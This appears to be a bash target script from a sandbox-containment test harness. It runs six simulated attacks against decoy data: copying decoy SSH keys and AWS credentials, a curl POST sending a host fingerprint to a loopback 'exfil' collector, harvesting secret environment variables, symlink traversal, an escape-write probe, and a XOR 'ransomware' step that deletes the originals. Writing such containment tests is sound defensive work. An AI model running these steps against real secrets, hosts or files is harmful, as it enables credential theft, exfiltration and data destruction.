#!/bin/bash
# Warden attack-harness target (rendered per phase by run-attacks.sh).
#
# Executes attack scenarios against decoy data and records:
#   steps.txt   name:RESULT     (what the attack achieved, phase-local view)
#   metrics.txt name:value      (measured quantities)
#
# The orchestrator decides PASS/FAIL: the control phase must succeed for a
# scenario to count (otherwise it is void), and containment verdicts are
# confirmed host-side (collector log, vault hashes). All data is decoy data
# created by the harness; every network destination is loopback.
set -u

OUT="@OUT@"              # rendered by the orchestrator
WORK="@WORK@"            # fixture dir (granted read by the sandbox policy)
VAULT="@VAULT@"          # decoy vault + planted secrets — OUTSIDE every grant
COLLECTOR="@COLLECTOR@"  # loopback exfil collector (host:port)
MARKER="@MARKER@"
STARTED="$OUT/started.txt"
STEPS="$OUT/steps.txt"
METRICS="$OUT/metrics.txt"

echo "$MARKER" > "$STARTED"
: > "$STEPS"
: > "$METRICS"

record() { echo "$1:$2" >> "$STEPS"; }
metric() { echo "$1:$2" >> "$METRICS"; }
now_ms() { python3 -c 'import time; print(int(time.time()*1000))' 2>/dev/null || echo 0; }

# --- 01 filesystem-exfil ------------------------------------------------------
# Copies decoy "SSH keys" and a decoy "AWS credentials" file from the vault
# (planted outside every grant, like a real ~/.ssh would be) to the granted
# output dir. Containment = no decoy-secret copies exist afterwards: the
# source paths are invisible, so the cp fails entirely.
T0=$(now_ms)
cp "$VAULT/decoy-home/id_ed25519"      "$OUT/" 2>/dev/null
cp "$VAULT/decoy-home/id_ed25519.pub"  "$OUT/" 2>/dev/null
cp "$VAULT/decoy-home/aws-credentials" "$OUT/" 2>/dev/null
T1=$(now_ms)
COPIED=$(ls "$OUT"/id_ed25519 "$OUT"/id_ed25519.pub "$OUT"/aws-credentials 2>/dev/null | wc -l | tr -d ' ')
metric fs_exfil_ms "$((T1 - T0))"
metric fs_exfil_files_copied "$COPIED"
if [ "$COPIED" -gt 0 ]; then record fs_exfil EXFILTRATED; else record fs_exfil BLOCKED; fi

# --- 02 network-exfil -----------------------------------------------------------
# POSTs a decoy fingerprint to the exfil collector. The collector is a
# loopback HTTP server owned by the orchestrator and the sandbox policy
# allows no network at all; containment = no POST arrives (checked
# authoritatively against the collector's own request log).
T0=$(now_ms)
curl -s --connect-timeout 3 -o /dev/null \
     -d "fingerprint=$(uname -a 2>/dev/null | head -c 120)" \
     "http://$COLLECTOR/exfil" 2>/dev/null
CURL_RC=$?
T1=$(now_ms)
metric net_exfil_ms "$((T1 - T0))"
metric net_exfil_curl_rc "$CURL_RC"
record net_exfil ATTEMPTED

# --- 03 env-stealer ---------------------------------------------------------------
# Harvests decoy secrets from the environment. The harness plants
# DECOY_AWS_KEY / DECOY_GITHUB_TOKEN / DECOY_DB_PASSWORD outside the env
# allowlist; containment = none are visible inside the sandbox.
T0=$(now_ms)
FOUND=0
for v in DECOY_AWS_KEY DECOY_GITHUB_TOKEN DECOY_DB_PASSWORD; do
    eval "val=\"\${$v:-}\""
    [ -n "$val" ] && FOUND=$((FOUND + 1))
done
T1=$(now_ms)
metric env_steal_ms "$((T1 - T0))"
metric env_secrets_found "$FOUND"
if [ "$FOUND" -gt 0 ]; then record env_steal SECRETS_STOLEN; else record env_steal BLOCKED; fi

# --- 04 process-spawner -------------------------------------------------------------
# Probes the host (whoami, uname, root listing) and attempts to write an
# escape-probe file INTO THE VAULT DIR — a host path outside every grant.
# The host-side check (does escape-probe.txt exist on the host afterwards?)
# is the authoritative verdict; this result is the phase-local view.
T0=$(now_ms)
WHOAMI_RC=0; whoami >/dev/null 2>&1 || WHOAMI_RC=$?
SPY_UNAME=$(uname -srm 2>/dev/null || true)
SPY_LS=$(ls / 2>/dev/null | wc -l | tr -d ' ')
# Regular builtin (echo), not `:` — dash treats a failed redirection on a
# special builtin as fatal and would kill the script instead of recording
# the denial. The vault path simply does not exist inside the sandbox
# (ungranted paths are invisible), which IS the containment result.
echo probe > "$VAULT/escape-probe.txt" 2>/dev/null && PROBE_WRITE=OK || PROBE_WRITE=DENIED
T1=$(now_ms)
metric process_spy_ms "$((T1 - T0))"
metric process_spy_whoami_rc "$WHOAMI_RC"
metric process_spy_uname "$SPY_UNAME"
metric process_spy_root_entries "$SPY_LS"
metric process_spy_vault_write_attempt "$PROBE_WRITE"
if [ "$PROBE_WRITE" = "OK" ]; then
    record process_spawn FULL_SYSTEM_ACCESS
else
    record process_spawn BLOCKED
fi

# --- 05 symlink-traversal -------------------------------------------------------------
# Plants a symlink in the granted output dir pointing at the vault master
# key (outside all grants), then reads through it. Containment = the read
# returns nothing.
ln -sf "$VAULT/vault-master.key" "$OUT/innocent-link" 2>/dev/null
THROUGH=$(cat "$OUT/innocent-link" 2>/dev/null | head -c 32)
if [ -n "$THROUGH" ]; then
    record symlink_traverse PARTIAL_ACCESS
else
    record symlink_traverse BLOCKED
fi

# --- 06 ransomware-sim ------------------------------------------------------------------
# "Encrypts" (XOR 0x5A — no real crypto, decoy files only) into the output
# dir, then deletes the originals. The vault is outside every grant.
# Damage = originals actually destroyed (rm only succeeds where the original
# is writable). The orchestrator verifies vault integrity via sha256.
T0=$(now_ms)
ENCRYPTED=0
DELETED=0
for f in "$WORK"/decoy-docs/*.txt; do
    [ -f "$f" ] || continue
    if python3 - "$f" "$OUT/$(basename "$f").enc" 2>/dev/null <<'PY'
import sys
data = open(sys.argv[1], 'rb').read()
open(sys.argv[2], 'wb').write(bytes(b ^ 0x5A for b in data))
PY
    then ENCRYPTED=$((ENCRYPTED + 1)); fi
    if rm -f "$f" 2>/dev/null && [ ! -f "$f" ]; then
        DELETED=$((DELETED + 1))
    fi
done
T1=$(now_ms)
metric ransom_ms "$((T1 - T0))"
metric ransom_files_encrypted "$ENCRYPTED"
metric ransom_originals_deleted "$DELETED"
if [ "$DELETED" -gt 0 ]; then
    record ransomware FILES_DESTROYED
else
    record ransomware NO_DAMAGE
fi

exit 0
